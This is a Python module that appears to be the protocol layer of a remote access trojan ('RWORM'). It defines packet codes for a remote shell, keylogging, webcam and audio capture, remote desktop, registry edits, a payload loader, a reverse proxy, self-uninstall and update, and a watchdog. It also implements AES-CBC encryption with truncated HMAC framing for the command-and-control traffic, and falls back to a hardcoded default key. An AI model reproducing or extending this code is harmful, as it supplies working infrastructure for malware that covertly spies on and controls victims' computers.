import struct
import hashlib
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hmac, hashes

PACKET_TYPES = {
    # Core
    'HEARTBEAT':     0x01,
    'SYSTEM_INFO':   0x02,
    'SHELL_COMMAND': 0x03,
    'SHELL_OUTPUT':  0x04,
    'FILE_REQUEST':  0x05,
    'FILE_DATA':     0x06,
    # Interactive shell
    'SHELL_OPEN':    0x20,
    'SHELL_INPUT':   0x21,
    'SHELL_STREAM':  0x22,
    'SHELL_CLOSE':   0x23,
    # File Manager 0x30-0x3F
    'FM_LIST_REQ':      0x30,
    'FM_LIST_RESP':     0x31,
    'FM_DOWNLOAD_REQ':  0x32,
    'FM_DOWNLOAD_DATA': 0x33,
    'FM_UPLOAD':        0x34,
    'FM_DELETE':        0x35,
    'FM_MKDIR':         0x36,
    'FM_RESULT':        0x37,
    # Keylogger 0x40-0x4F
    'KEYLOG_START':  0x40,
    'KEYLOG_STOP':   0x41,
    'KEYLOG_DATA':   0x42,
    'KEYLOG_DUMP':   0x43,  # request offline log dump
    # Process Manager 0x50-0x5F
    'PROC_LIST_REQ':  0x50,
    'PROC_LIST_RESP': 0x51,
    'PROC_KILL':      0x52,
    # System Metrics 0x55-0x56
    'METRICS_REQ':    0x55,
    'METRICS_RESP':   0x56,
    # Registry 0x60-0x6F
    'REG_LIST_REQ':  0x60,
    'REG_LIST_RESP': 0x61,
    'REG_READ_REQ':  0x62,
    'REG_READ_RESP': 0x63,
    'REG_WRITE':     0x64,
    'REG_DELETE':    0x65,
    # Loader 0x70-0x7F
    'LOADER_EXEC':   0x70,
    'LOADER_RESULT': 0x71,
    # Remote Desktop 0x80-0x8F
    'RD_START':  0x80,
    'RD_FRAME':  0x81,
    'RD_INPUT':  0x82,
    'RD_STOP':   0x83,
    'RD_MONITORS_REQ':  0x84,
    'RD_MONITORS_RESP': 0x85,
    # Service Manager 0xC0-0xC3
    'SERVICES_LIST_REQ':  0xC0,
    'SERVICES_LIST_RESP': 0xC1,
    'SERVICE_CTRL_REQ':   0xC2,
    'SERVICE_CTRL_RESP':  0xC3,
    # Net Monitor 0xC4-0xC5
    'NET_LIST_REQ':       0xC4,
    'NET_LIST_RESP':      0xC5,
    # Autorun / Startup 0xC6-0xC9
    'STARTUP_LIST_REQ':   0xC6,
    'STARTUP_LIST_RESP':  0xC7,
    'STARTUP_DEL_REQ':    0xC8,
    'STARTUP_DEL_RESP':   0xC9,
    # Clipboard 0xCA-0xCD
    'CLIPBOARD_GET_REQ':  0xCA,
    'CLIPBOARD_GET_RESP': 0xCB,
    'CLIPBOARD_SET_REQ':  0xCC,
    'CLIPBOARD_SET_RESP': 0xCD,
    # Reverse Proxy 0x90-0x9F
    'PROXY_START': 0x90,
    'PROXY_DATA':  0x91,
    'PROXY_STOP':  0x92,
    # Client control 0xA0-0xAF
    'CLIENT_CLOSE':     0xA0,
    'CLIENT_UNINSTALL': 0xA1,
    'CLIENT_UPDATE':    0xA2,
    'WATCHDOG_STOP':    0xA5,
    'WATCHDOG_START':   0xA6,
    # Task on connect 0xB0-0xBF
    'TASK_EXEC':   0xB0,
    'TASK_RESULT': 0xB1,
    # GET_CLIENTS (GUI control)
    'GET_CLIENTS':      0x10,
    'GET_CLIENTS_RESP': 0x11,
    # URL & System 0xD0-0xD8
    'OPEN_URL':          0xD0,
    'OPEN_URL_RESP':     0xD1,
    'INSTALLED_PROGS_REQ': 0xD2,
    'INSTALLED_PROGS_RESP': 0xD3,
    'SYSINFO_REQ':       0xD4,
    'SYSINFO_RESP':      0xD5,
    'PC_POWER':          0xD6,
    'PC_POWER_RESP':     0xD7,
    # Webcam 0xE0-0xE4
    'WEBCAM_DEVICES_REQ': 0xE0,
    'WEBCAM_DEVICES_RESP': 0xE1,
    'WEBCAM_START':       0xE2,
    'WEBCAM_FRAME':       0xE3,
    'WEBCAM_STOP':        0xE4,
    # Audio 0xE5-0xE7
    'AUDIO_START':        0xE5,
    'AUDIO_STREAM':       0xE6,
    'AUDIO_STOP':         0xE7,
    # MessageBox 0xD8-0xD9
    'MSGBOX_REQ':         0xD8,
    'MSGBOX_RESP':        0xD9,
    # Chat 0xEA-0xED
    'CHAT_MSG_SEND':      0xEA,
    'CHAT_MSG_RECV':      0xEB,
    'CHAT_CLOSE':         0xEC,
    # Error
    'ERROR': 0xFF,
}

DEFAULT_KEY_STR = os.environ.get("RWORM_KEY", "AES-256-DEFAULT")
CURRENT_KEY = hashlib.sha256(DEFAULT_KEY_STR.encode('utf-8')).digest()

def set_encryption_key(key_str: str):
    global CURRENT_KEY
    CURRENT_KEY = hashlib.sha256(key_str.encode('utf-8')).digest()

def aes_encrypt(data: bytes, key: bytes = None) -> bytes:
    if key is None:
        key = CURRENT_KEY
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(padded_data) + encryptor.finalize()
    return iv + ciphertext

def aes_decrypt(data: bytes, key: bytes = None) -> bytes:
    if key is None:
        key = CURRENT_KEY
    if len(data) < 16:
        return None
    iv = data[:16]
    ciphertext = data[16:]
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    try:
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        unpadder = padding.PKCS7(128).unpadder()
        return unpadder.update(padded_data) + unpadder.finalize()
    except Exception:
        return None

def compute_hmac(data: bytes, key: bytes = None) -> bytes:
    if key is None:
        key = CURRENT_KEY
    h = hmac.HMAC(key, hashes.SHA256())
    h.update(data)
    return h.finalize()[:16]

class Packet:
    def __init__(self, packet_type: int, payload: bytes, session_id: int = 0):
        self.type       = packet_type
        self.payload    = payload
        self.session_id = session_id

    def serialize(self) -> bytes:
        encrypted_payload = aes_encrypt(self.payload)
        payload_len = len(encrypted_payload)
        header = struct.pack('<IBI', payload_len, self.type, self.session_id)
        mac = compute_hmac(header + encrypted_payload)
        return header + encrypted_payload + mac

    @staticmethod
    def deserialize(data: bytes):
        if len(data) < 25:
            return None
        header = data[:9]
        payload_len, packet_type, session_id = struct.unpack('<IBI', header)
        if len(data) < 9 + payload_len + 16:
            return None
        encrypted_payload = data[9:9 + payload_len]
        rcv_mac           = data[9 + payload_len:9 + payload_len + 16]
        expected_mac      = compute_hmac(header + encrypted_payload)
        if rcv_mac != expected_mac:
            return None
        plain_payload = aes_decrypt(encrypted_payload)
        if plain_payload is None:
            return None
        return Packet(packet_type, plain_payload, session_id)

def create_packet(packet_type, payload: bytes, session_id: int = 0) -> bytes:
    if isinstance(packet_type, str):
        packet_type = PACKET_TYPES[packet_type]
    return Packet(packet_type, payload, session_id).serialize()

def parse_packet(data: bytes):
    return Packet.deserialize(data)
